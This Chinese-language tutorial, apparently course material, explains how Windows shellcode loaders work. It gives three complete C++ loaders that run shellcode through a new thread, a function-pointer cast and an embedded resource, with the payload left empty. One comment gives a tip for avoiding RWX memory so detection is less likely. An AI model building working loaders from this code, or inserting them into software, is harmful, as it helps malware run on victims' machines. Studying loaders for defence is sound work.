# Common Shellcode Loader

​	有许多方法可以加载shellcode，但通常的流程包括三个步骤：

1. 申请内存

2. 将shellcode复制到内存中

3. 执行shellcode

   

   本小结不会详细列举所有的shellcodeloader，而是专注于深入讲解最经典的执行方式。



### 创建线程执行shellcode

#### 核心函数

**VirtualAlloc**

https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc

`VirtualAlloc` 函数用于在进程的虚拟地址空间中分配内存，并返回分配的内存的起始地址。以下是每个参数的含义：

```c++
LPVOID VirtualAlloc(
  LPVOID lpAddress, //要分配的内存区域的首选基地址。
  SIZE_T dwSize, //要分配的内存区域的大小，以字节为单位。 
  DWORD  flAllocationType, //指定内存分配类型的一组标志。
  DWORD  flProtect //指定内存页面的保护属性的一组标志。
);
```



**RtlMoveMemory**

https://learn.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory

`RtlMoveMemory` 函数是 Windows API 中的一个函数，用于将内存块中的数据从一个位置复制到另一个位置。

```c++
VOID RtlMoveMemory(
  VOID UNALIGNED *Destination, //这是一个指向目标内存块的指针，表示要将数据复制到的位置
  const VOID UNALIGNED *Source, //这是一个指向源内存块的指针，表示要从哪里复制数据
  SIZE_T         Length //这是要复制的数据的字节数
);
```

函数的作用是将源内存块中的数据复制到目标内存块中，长度为 `Length` 字节。这个函数类似于 `memcpy` 函数，但是在处理内存对齐方面更加灵活。



**VirtualProtect**

https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect

`VirtualProtect` 函数是 Windows API 中的一个函数，用于更改指定内存区域的访问权限。

```c++
BOOL VirtualProtect(
  LPVOID lpAddress,	//指向要修改保护属性的内存区域的起始地址的指针。
  SIZE_T dwSize, //要修改保护属性的内存区域的大小，以字节为单位。
  DWORD  flNewProtect, //要设置的新的访问权限和页面属性的组合。
  PDWORD lpflOldProtect //指向变量的指针，用于存储之前的访问权限和页面属性。
);
```

函数的作用是将指定内存区域的访问权限和页面属性设置为新的值，并将之前的值存储在指定的变量中。



**CreateThread**                                                                                        

https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread

`CreateThread` 函数是 Windows API 中的一个函数，用于在当前进程中创建一个新的线程。

```c++
HANDLE CreateThread(
  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
  SIZE_T                  dwStackSize,
  LPTHREAD_START_ROUTINE  lpStartAddress,
  __drv_aliasesMem LPVOID lpParameter,
  DWORD                   dwCreationFlags,
  LPDWORD                 lpThreadId
);
```



#### 代码讲解

```c++
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
  DWORD oldprotect = 0;

	//shellcode在main函数内，存储在pe结构的sections table中的.text部分
	unsigned char payload[] = {};
	unsigned int payload_len = sizeof(payload);
	
	// 使用VirtualAlloc申请一个可读可写的内存，这里没有申请执行权限是为了防止出现RWX权限的敏感内存
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// 将shellcode复制到申请的内存中，这里还可以用memcpy等
	RtlMoveMemory(exec_mem, payload, payload_len);
	
	// 使用VirtualProtect添加执行权限
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

	// 如果返回正常，创建线程执行shellcode
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}

```



### 函数指针转换执行shellcode

其他步骤都一样，在执行shellcode时不使用CreateThread，使用(void(*)())exec_mem)();执行内存。

让我们逐步解释这个表达式：

- `(void(*)())`：这是一个类型转换操作符，用于将其后的表达式转换为指定的类型。在这里，`(void(*)())` 表示将表达式转换为一个函数指针类型。
- `()`：表示一个函数调用运算符。在这个表达式中，我们没有提供任何函数名，而是在括号内使用了一个函数指针类型的转换操作。
- `*`：表示指针。在函数指针类型中，`*` 用于表示一个指向函数的指针。
- `void`：表示函数的返回类型。在这个表达式中，我们指定函数的返回类型为 `void`，表示函数不返回任何值。
- `()`：表示函数的参数列表。在这个表达式中，空括号表示函数没有参数。

因此，`(void(*)())` 表示一个没有参数并且返回类型为 `void` 的函数指针类型。

整个表达式 `(void(*)())exec_mem` 将指向内存中机器码的指针 `exec_mem` 转换为一个函数指针，使得我们可以通过函数指针的方式调用内存中的机器码，即执行 shellcode。

```c++
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
  DWORD oldprotect = 0;

	//shellcode在main函数内，存储在pe结构的sections table中的.text部分
	unsigned char payload[] = {};
	unsigned int payload_len = sizeof(payload);
	
	// 使用VirtualAlloc申请一个可读可写的内存，这里没有申请执行权限是为了防止出现RWX权限的敏感内存
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// 将shellcode复制到申请的内存中，这里还可以用memcpy等
	RtlMoveMemory(exec_mem, payload, payload_len);
	
	// 使用VirtualProtect添加执行权限
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

	// 如果返回正常，函数指针类型转换执行shellcode
	if ( rv != 0 ) {
			((void(*)())exec_mem)();
	}

	return 0;
}

```

### 资源加载shellcode

生成bin文件shellcode

**VisualStudio->解决方案->资源文件->添加->资源**

![image-20230419174631527](./README.assets/image-20230419174631527.png)

导入-自定义资源类型

![image-20230419174745700](./README.assets/image-20230419174745700.png)

ctrl+s 保存

![image-20230419174847116](./README.assets/image-20230419174847116.png)



```c++
#include"resource.h"
#include <windows.h>
#include<iostream>


int main() {
    {
        HRSRC Res = FindResource(NULL, MAKEINTRESOURCE(IDR_BIN1), L"bin"); DWORD Size = SizeofResource(NULL, Res);
        HGLOBAL Load = LoadResource(NULL, Res);
        void* buffer = VirtualAlloc(0, Size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        memcpy(buffer, Load, Size);
        ((void(*)())buffer)();

    }

}
```

64位release生成解决方案(shellcode位数要与release位数相同)
